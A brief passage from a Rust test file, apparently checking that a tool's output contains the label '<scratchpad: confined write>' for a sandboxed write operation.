                    .as_str()
                    .unwrap()
                    .contains("<scratchpad: confined write>"),
                "{output}"
            );
        }
    }
}
